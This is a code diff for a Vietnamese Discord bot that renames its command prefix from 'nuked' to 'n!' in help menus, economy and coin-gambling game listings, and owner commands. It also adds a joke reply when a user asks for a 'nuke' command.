-            "nuked hug @user": "🤗 Ôm",
-            "nuked kiss @user": "😘 Hôn",
-            "nuked slap @user": "👋 Tát",
-            "nuked pat @user": "🫳 Vỗ đầu",
-            "nuked cuddle @user": "🥰 Âu yếm",
-            "nuked marry @user": "💍 Kết hôn",
-            "nuked divorce @user": "💔 Ly hôn",
-            "nuked ship @user1 @user2": "💞 Ghép đôi",
-            "nuked crush @user": "💌 Tỏ tình"
+            "n! love @user1 @user2": "💘 Tỷ lệ tình yêu",
+            "n! hug @user": "🤗 Ôm",
+            "n! kiss @user": "😘 Hôn",
+            "n! slap @user": "👋 Tát",
+            "n! pat @user": "🫳 Vỗ đầu",
+            "n! cuddle @user": "🥰 Âu yếm",
+            "n! marry @user": "💍 Kết hôn",
+            "n! divorce @user": "💔 Ly hôn",
+            "n! ship @user1 @user2": "💞 Ghép đôi",
+            "n! crush @user": "💌 Tỏ tình"
         }
     }
 }
@@ -2898,7 +2894,7 @@ class HelpSelect(discord.ui.Select):
                 description=(
                     "Chào mừng bạn đến với hệ thống Bot đẳng cấp hàng đầu!\n"
                     "Hãy chọn danh mục ở Menu thả xuống để khám phá danh sách lệnh chi tiết.\n\n"
-                    "📌 **Prefix mặc định:** `nuked`\n"
+                    "📌 **Prefix mặc định:** `n!`\n"
                     "👑 **Sở hữu bởi:** Boss Bảo & Đồng minh Tối Cao\n"
                     "💡 **Gợi ý:** Sử dụng các lệnh kinh tế để kiếm coin và tham gia game!"
                 ),
@@ -2940,7 +2936,7 @@ async def help_command(ctx):
         description=(
             "Chào mừng bạn đến với hệ thống Bot đẳng cấp hàng đầu!\n"
             "Hãy chọn danh mục ở Menu thả xuống để khám phá danh sách lệnh chi tiết.\n\n"
-            "📌 **Prefix mặc định:** `nuked`\n"
+            "📌 **Prefix mặc định:** `n!`\n"
             "👑 **Sở hữu bởi:** Boss Bảo & Đồng minh Tối Cao\n"
             "💡 **Gợi ý:** Sử dụng các lệnh kinh tế để kiếm coin và tham gia game!"
         ),
@@ -3000,14 +2996,14 @@ class GameMenuView(discord.ui.View):
             embed = discord.Embed(
                 title="💵 DANH MỤC LỆNH KIẾM TIỀN 💵",
                 description=(
-                    "💰 `nuked balance` — Xem số dư ví & ngân hàng 💳\n"
-                    "🎁 `nuked daily` — Nhận quà mỗi ngày (100 - 500 coin) 🌟\n"
-                    "💼 `nuked work` — Tăng ca kiếm thêm thu nhập 🛠️\n"
-                    "🥺 `nuked beg` — Xin tiền cư dân mạng 🤲\n"
-                    "🥷 `nuked crime` — Đi trộm cướp (Cẩn thận đi tù!) 🚨\n"
-                    "🏦 `nuked bank deposit <số>` — Gửi tiền gửi tiết kiệm 🔒\n"
-                    "💸 `nuked bank withdraw <số>` — Rút tiền mặt ra tiêu 🏧\n"
-                    "🤝 `nuked give @user <số>` — Chuyển tiền cho bạn bè 🎁"
+                    "💰 `n! balance` — Xem số dư ví & ngân hàng 💳\n"
+                    "🎁 `n! daily` — Nhận quà mỗi ngày (100 - 500 coin) 🌟\n"
+                    "💼 `n! work` — Tăng ca kiếm thêm thu nhập 🛠️\n"
+                    "🥺 `n! beg` — Xin tiền cư dân mạng 🤲\n"
+                    "🥷 `n! crime` — Đi trộm cướp (Cẩn thận đi tù!) 🚨\n"
+                    "🏦 `n! bank deposit <số>` — Gửi tiền gửi tiết kiệm 🔒\n"
+                    "💸 `n! bank withdraw <số>` — Rút tiền mặt ra tiêu 🏧\n"
+                    "🤝 `n! give @user <số>` — Chuyển tiền cho bạn bè 🎁"
                 ),
                 color=0x00FFCC
             )
@@ -3017,10 +3013,10 @@ class GameMenuView(discord.ui.View):
             embed = discord.Embed(
                 title="🎲 DANH MỤC MINI GAMES 🎲",
                 description=(
-                    "🪙 `nuked coinflip <tiền> <h/t>` — Tung đồng xu 50/50 ✨\n"
-                    "🎲 `nuked dice <tiền> <1-6>` — Đoán mặt xúc xắc x4 🎯\n"
-                    "✂️ `nuked rps <tiền> <r/p/s>` — Oẳn tù tì ăn tiền 🪨\n"
-                    "🎴 `nuked hilo <tiền> <h/l>` — Đoán bài Cao hay Thấp 📈"
+                    "🪙 `n! coinflip <tiền> <h/t>` — Tung đồng xu 50/50 ✨\n"
+                    "🎲 `n! dice <tiền> <1-6>` — Đoán mặt xúc xắc x4 🎯\n"
+                    "✂️ `n! rps <tiền> <r/p/s>` — Oẳn tù tì ăn tiền 🪨\n"
+                    "🎴 `n! hilo <tiền> <h/l>` — Đoán bài Cao hay Thấp 📈"
                 ),
                 color=0x2ECC71
             )
@@ -3030,10 +3026,10 @@ class GameMenuView(discord.ui.View):
             embed = discord.Embed(
                 title="🎰 SÒNG BẠC CASINO THỜI THƯỢNG 🎰",
                 description=(
-                    "🎰 `nuked slots <tiền>` — Máy quay xèng Jackpot x5 💎\n"
-                    "🚀 `nuked crash <tiền>` — Tên lửa vũ trụ nhân tiền 💥\n"
-                    "🎫 `nuked lottery <tiền>` — Mua vé số đại phát x10 🧧\n"
-                    "🃏 `nuked blackjack <tiền>` — Xì dách 21 điểm cực đỉnh ♠️"
+                    "🎰 `n! slots <tiền>` — Máy quay xèng Jackpot x5 💎\n"
+                    "🚀 `n! crash <tiền>` — Tên lửa vũ trụ nhân tiền 💥\n"
+                    "🎫 `n! lottery <tiền>` — Mua vé số đại phát x10 🧧\n"
+                    "🃏 `n! blackjack <tiền>` — Xì dách 21 điểm cực đỉnh ♠️"
                 ),
                 color=0xE74C3C
             )
@@ -3043,10 +3039,10 @@ class GameMenuView(discord.ui.View):
             embed = discord.Embed(
                 title="🛒 CỬA HÀNG & ROLE SHOP 🛒",
                 description=(
-                    "🛍️ `nuked shop` — Xem danh sách vật phẩm hỗ trợ 📜\n"
-                    "💳 `nuked buyitem <tên>` — Mua vật phẩm từ Shop 📦\n"
-                    "🎒 `nuked inventory` — Mở túi đồ cá nhân 🎒\n"
-                    "🏷️ `nuked buyrole <tên>` — Dùng coin mua Role VIP 👑"
+                    "🛍️ `n! shop` — Xem danh sách vật phẩm hỗ trợ 📜\n"
+                    "💳 `n! buyitem <tên>` — Mua vật phẩm từ Shop 📦\n"
+                    "🎒 `n! inventory` — Mở túi đồ cá nhân 🎒\n"
+                    "🏷️ `n! buyrole <tên>` — Dùng coin mua Role VIP 👑"
                 ),
                 color=0xF1C40F
             )
@@ -3055,7 +3051,7 @@ class GameMenuView(discord.ui.View):
         elif cid == "lb":
             embed = discord.Embed(
                 title="🏆 BẢNG XẾP HẠNG 🏆",
-                description="📊 `nuked leaderboard` — Top 10 đại gia server 👑",
+                description="📊 `n! leaderboard` — Top 10 đại gia server 👑",
                 color=0x9B59B6
             )
             await interaction.response.send_message(embed=embed, ephemeral=True)
@@ -3089,15 +3085,15 @@ class GuideView(discord.ui.View):
                 title="💰 KINH TẾ & COIN",
                 description=(
                     "**Các lệnh kiếm và quản lý coin:**\n"
-                    "💰 `nuked balance` – Xem số dư ví và ngân hàng.\n"
-                    "🎁 `nuked daily` – Nhận thưởng mỗi ngày (100-500 coin).\n"
-                    "💼 `nuked work` – Làm việc kiếm 50-300 coin (mỗi 1h).\n"
-                    "🥺 `nuked beg` – Xin tiền người khác (mỗi 30s).\n"
-                    "🚨 `nuked crime` – Trộm cướp (mỗi 60s, 55% thành công).\n"
-                    "🏦 `nuked bank deposit <số/all>` – Gửi tiền vào ngân hàng.\n"
-                    "💸 `nuked bank withdraw <số/all>` – Rút tiền về ví.\n"
-                    "🤝 `nuked give @user <số>` – Chuyển coin cho bạn bè.\n"
-                    "🏆 `nuked leaderboard` – Xem top 10 đại gia.\n\n"
+                    "💰 `n! balance` – Xem số dư ví và ngân hàng.\n"
+                    "🎁 `n! daily` – Nhận thưởng mỗi ngày (100-500 coin).\n"
+                    "💼 `n! work` – Làm việc kiếm 50-300 coin (mỗi 1h).\n"
+                    "🥺 `n! beg` – Xin tiền người khác (mỗi 30s).\n"
+                    "🚨 `n! crime` – Trộm cướp (mỗi 60s, 55% thành công).\n"
+                    "🏦 `n! bank deposit <số/all>` – Gửi tiền vào ngân hàng.\n"
+                    "💸 `n! bank withdraw <số/all>` – Rút tiền về ví.\n"
+                    "🤝 `n! give @user <số>` – Chuyển coin cho bạn bè.\n"
+                    "🏆 `n! leaderboard` – Xem top 10 đại gia.\n\n"
                     "💡 **Mẹo:** Hãy dùng `daily` và `work` mỗi ngày để tích lũy nhanh."
                 ),
                 color=0xF1C40F
@@ -3106,14 +3102,14 @@ class GuideView(discord.ui.View):
                 title="🎮 TRÒ CHƠI GIẢI TRÍ",
                 description=(
                     "**Các trò chơi may rủi (đặt cược bằng coin):**\n"
-                    "🪙 `nuked coinflip <tiền> <h/t>` – Tung đồng xu (x2).\n"
-                    "🎲 `nuked dice <tiền> <1-6>` – Đoán xúc xắc (x4).\n"
-                    "✂️ `nuked rps <tiền> <r/p/s>` – Oẳn tù tì (x2).\n"
-                    "🎴 `nuked hilo <tiền> <h/l>` – Cao / thấp hơn 7 (x1.8).\n"
-                    "🎰 `nuked slots <tiền>` – Máy quay xèng (jackpot x5).\n"
-                    "🚀 `nuked crash <tiền>` – Tên lửa – dừng đúng lúc để nhân tiền.\n"
-                    "🎫 `nuked lottery <tiền>` – Xổ số (x10 nếu trúng).\n"
-                    "🃏 `nuked blackjack <tiền>` – Xì dách 21 điểm (x2).\n\n"
+                    "🪙 `n! coinflip <tiền> <h/t>` – Tung đồng xu (x2).\n"
+                    "🎲 `n! dice <tiền> <1-6>` – Đoán xúc xắc (x4).\n"
+                    "✂️ `n! rps <tiền> <r/p/s>` – Oẳn tù tì (x2).\n"
+                    "🎴 `n! hilo <tiền> <h/l>` – Cao / thấp hơn 7 (x1.8).\n"
+                    "🎰 `n! slots <tiền>` – Máy quay xèng (jackpot x5).\n"
+                    "🚀 `n! crash <tiền>` – Tên lửa – dừng đúng lúc để nhân tiền.\n"
+                    "🎫 `n! lottery <tiền>` – Xổ số (x10 nếu trúng).\n"
+                    "🃏 `n! blackjack <tiền>` – Xì dách 21 điểm (x2).\n\n"
                     "💡 **MẸO:** Chơi `slots` hoặc `lottery` để có cơ hội thắng lớn, nhưng rủi ro cao!"
                 ),
                 color=0x2ECC71
@@ -3122,16 +3118,16 @@ class GuideView(discord.ui.View):
                 title="💘 TÌNH YÊU & TƯƠNG TÁC",
                 description=(
                     "**Các lệnh tương tác vui vẻ:**\n"
-                    "💕 `nuked love @user1 @user2` – Tính tỷ lệ tình yêu.\n"
-                    "🤗 `nuked hug @user` – Ôm người khác.\n"
-                    "😘 `nuked kiss @user` – Hôn người khác.\n"
-                    "👋 `nuked slap @user` – Tát người khác.\n"
-                    "🫳 `nuked pat @user` – Vỗ đầu người khác.\n"
-                    "🥰 `nuked cuddle @user` – Âu yếm.\n"
-                    "💍 `nuked marry @user` – Kết hôn (lưu vào file).\n"
-                    "💔 `nuked divorce @user` – Ly hôn.\n"
-                    "💞 `nuked ship @user1 @user2` – Ghép đôi ngẫu nhiên.\n"
-                    "💌 `nuked crush @user` – Tỏ tình.\n\n"
+                    "💕 `n! love @user1 @user2` – Tính tỷ lệ tình yêu.\n"
+                    "🤗 `n! hug @user` – Ôm người khác.\n"
+                    "😘 `n! kiss @user` – Hôn người khác.\n"
+                    "👋 `n! slap @user` – Tát người khác.\n"
+                    "🫳 `n! pat @user` – Vỗ đầu người khác.\n"
+                    "🥰 `n! cuddle @user` – Âu yếm.\n"
+                    "💍 `n! marry @user` – Kết hôn (lưu vào file).\n"
+                    "💔 `n! divorce @user` – Ly hôn.\n"
+                    "💞 `n! ship @user1 @user2` – Ghép đôi ngẫu nhiên.\n"
+                    "💌 `n! crush @user` – Tỏ tình.\n\n"
                     "💡 **VUI:** Hãy thử `marry` và `divorce` để tạo không khí hài hước!"
                 ),
                 color=0xFF1493
@@ -3140,20 +3136,20 @@ class GuideView(discord.ui.View):
                 title="🛠️ LỆNH QUẢN TRỊ (OWNER)",
                 description=(
                     "**Các lệnh dành riêng cho chủ bot (Boss Bảo):**\n"
-                    "👑 `nuked addowner @user` – Thêm owner.\n"
-                    "🗑️ `nuked deleteowner @user` – Xóa owner.\n"
-                    "📊 `nuked setlv <level> @user` – Set level cho user.\n"
-                    "📢 `nuked setlevelchannel #kênh` – Cài kênh thông báo level.\n"
-                    "📋 `nuked log #kênh` – Cài kênh log sự kiện.\n"
-                    "🎉 `nuked setwelcome #kênh` – Cài kênh chào mừng.\n"
-                    "👋 `nuked setgoodbye #kênh` – Cài kênh tạm biệt.\n"
-                    "💾 `nuked backup` – Backup server.\n"
-                    "🔄 `nuked restore` – Restore server.\n"
-                    "🚫 `nuked off <lệnh>` – Tắt một lệnh.\n"
-                    "✅ `nuked on <lệnh>` – Bật lại lệnh.\n"
-                    "🛑 `nuked off` (không tham số) – Tắt toàn bộ bot.\n"
-                    "🔛 `nuked on` (không tham số) – Bật lại bot.\n\n"
-                    "💡 **LƯU Ý:** Các lệnh `setup`, `showsv`, `nuke`, `spam...` cũng thuộc nhóm này."
+                    "👑 `n! addowner @user` – Thêm owner.\n"
+                    "🗑️ `n! deleteowner @user` – Xóa owner.\n"
+                    "📊 `n! setlv <level> @user` – Set level cho user.\n"
+                    "📢 `n! setlevelchannel #kênh` – Cài kênh thông báo level.\n"
+                    "📋 `n! log #kênh` – Cài kênh log sự kiện.\n"
+                    "🎉 `n! setwelcome #kênh` – Cài kênh chào mừng.\n"
+                    "👋 `n! setgoodbye #kênh` – Cài kênh tạm biệt.\n"
+                    "💾 `n! backup` – Backup server.\n"
+                    "🔄 `n! restore` – Restore server.\n"
+                    "🚫 `n! off <lệnh>` – Tắt một lệnh.\n"
+                    "✅ `n! on <lệnh>` – Bật lại lệnh.\n"
+                    "🛑 `n! off` (không tham số) – Tắt toàn bộ bot.\n"
+                    "🔛 `n! on` (không tham số) – Bật lại bot.\n\n"
+                    "💡 **LƯU Ý:** Các lệnh `setup`, `showsv`, `spam...` cũng thuộc nhóm này."
                 ),
                 color=0x9B59B6
             ),
@@ -3161,16 +3157,16 @@ class GuideView(discord.ui.View):
                 title="❓ LỆNH CƠ BẢN CHO MỌI NGƯỜI",
                 description=(
                     "**Những lệnh hữu ích hàng ngày:**\n"
-                    "📖 `nuked help` – Mở menu trợ giúp tổng hợp.\n"
-                    "🎮 `nuked games` – Mở trung tâm giải trí.\n"
-                    "👤 `nuked userinfo @user` – Xem thông tin người dùng.\n"
-                    "🖼️ `nuked avatar @user` – Xem avatar.\n"
-                    "🏰 `nuked serverinfo` – Xem thông tin server.\n"
-                    "👥 `nuked membercount` – Xem số thành viên.\n"
-                    "🎒 `nuked inventory` – Xem túi đồ của bạn.\n"
-                    "🛒 `nuked shop` – Mở cửa hàng mua vật phẩm.\n"
-                    "💳 `nuked buyitem <tên>` – Mua nhanh vật phẩm.\n"
-                    "📨 `nuked guithu @user <nội dung>` – Gửi tin nhắn riêng.\n\n"
+                    "📖 `n! help` – Mở menu trợ giúp tổng hợp.\n"
+                    "🎮 `n! games` – Mở trung tâm giải trí.\n"
+                    "👤 `n! userinfo @user` – Xem thông tin người dùng.\n"
+                    "🖼️ `n! avatar @user` – Xem avatar.\n"
+                    "🏰 `n! serverinfo` – Xem thông tin server.\n"
+                    "👥 `n! membercount` – Xem số thành viên.\n"
+                    "🎒 `n! inventory` – Xem túi đồ của bạn.\n"
+                    "🛒 `n! shop` – Mở cửa hàng mua vật phẩm.\n"
+                    "💳 `n! buyitem <tên>` – Mua nhanh vật phẩm.\n"
+                    "📨 `n! guithu @user <nội dung>` – Gửi tin nhắn riêng.\n\n"
                     "💡 **GỢI Ý:** Hãy dùng `help` và `games` để khám phá tất cả tính năng."
                 ),
                 color=0x3498DB
@@ -3249,7 +3245,7 @@ async def off_command(ctx, *, command_name: str = None):
     global bot_enabled
     if command_name is None:
         bot_enabled = False
-        await ctx.send("🛑 Boss Bảo đã tạm dừng bot. Gõ `nuked on` để bật lại.")
+        await ctx.send("🛑 Boss Bảo đã tạm dừng bot. Gõ `n! on` để bật lại.")
         return
     cmd = bot.get_command(command_name.lower())
     if cmd is None:
@@ -3263,7 +3259,7 @@ async def off_command(ctx, *, command_name: str = None):
         return
     DISABLED_COMMANDS.add(cmd.name)
     save_all_data()
-    await ctx.send(f"✅ Đã tắt lệnh `{cmd.name}`! Gõ `nuked on {cmd.name}` để bật lại.")
+    await ctx.send(f"✅ Đã tắt lệnh `{cmd.name}`! Gõ `n! on {cmd.name}` để bật lại.")
 
 @off_command.error
 async def off_error(ctx, error):
@@ -3302,10 +3298,10 @@ async def on_error(ctx, error):
 async def globally_disabled_check(ctx):
     if not bot_enabled:
         if ctx.command and ctx.command.name != "on":
-            await ctx.send("🛑 Bot đang tạm dừng. Gõ `nuked on` để bật lại.")
+            await ctx.send("🛑 Bot đang tạm dừng. Gõ `n! on` để bật lại.")
             return False
     if ctx.command and ctx.command.name in DISABLED_COMMANDS:
-        await ctx.send(f"❌ Lệnh `{ctx.command.name}` đã bị tắt bởi Boss Bảo. Gõ `nuked on {ctx.command.name}` để bật lại.")
+        await ctx.send(f"❌ Lệnh `{ctx.command.name}` đã bị tắt bởi Boss Bảo. Gõ `n! on {ctx.command.name}` để bật lại.")
         return False
     return True
 
@@ -3687,7 +3683,7 @@ async def bank(ctx, action: str = None, amount: str = None):
     if not action or action not in ["deposit", "withdraw", "dep", "with"]:
         embed = discord.Embed(
             title="🏦 NGÂN HÀNG CENTRAL BANK 🏦",
-            description=f"💵 Tiền mặt: `{bal:,} coin`\n🏦 Tiền gửi: `{bank_bal:,} coin`\n\n👉 **Cú pháp:**\n• `nuked bank deposit <số tiền/all>`\n• `nuked bank withdraw <số tiền/all>`",
+            description=f"💵 Tiền mặt: `{bal:,} coin`\n🏦 Tiền gửi: `{bank_bal:,} coin`\n\n👉 **Cú pháp:**\n• `n! bank deposit <số tiền/all>`\n• `n! bank withdraw <số tiền/all>`",
             color=0x00FFCC
         )
         await ctx.send(embed=embed)
@@ -3798,6 +3794,16 @@ async def on_message(message):
     if message.author.bot:
         return
 
+    # Xử lý prefix mới và nội dung "nuke"
+    prefixes = ('n!', 'N!', 'n! ', 'N! ')
+    for prefix in prefixes:
+        if message.content.lower().startswith(prefix.lower()):
+            content_after = message.content[len(prefix):].lstrip()
+            if content_after.lower().startswith("nuke"):
+                await message.reply("làm gì có lệnh nuke ngáo à")
+                return
+            break
+
     # Xử lý lệnh
     await bot.process_commands(message)
 
@@ -3809,7 +3815,7 @@ async def on_message(message):
                 break
 
     # Tự động tăng exp (chỉ trong kênh text, không tính lệnh)
-    if not message.content.startswith("nuked") and not message.content.startswith("nuked "):
+    if not message.content.startswith("n!") and not message.content.startswith("N!") and not message.content.startswith("n! ") and not message.content.startswith("N! "):
         # Tăng exp ngẫu nhiên từ 1-10
         exp_gain = random.randint(1, 10)
         old_level = get_user_level(message.author.id)
@@ -3840,7 +3846,7 @@ async def on_message(message):
             # Gán role theo level
             await check_and_assign_level_roles(message.author, new_level)
 
-    # Phản hồi khi gõ "nuked" không hợp lệ
+    # Phản hồi khi gõ "nuked" không hợp lệ (prefix cũ)
     if message.content.lower().startswith("nuked"):
         content_without_prefix = message.content[len("nuked "):].strip() if len(message.content) > 5 else ""
         if content_without_prefix == "":
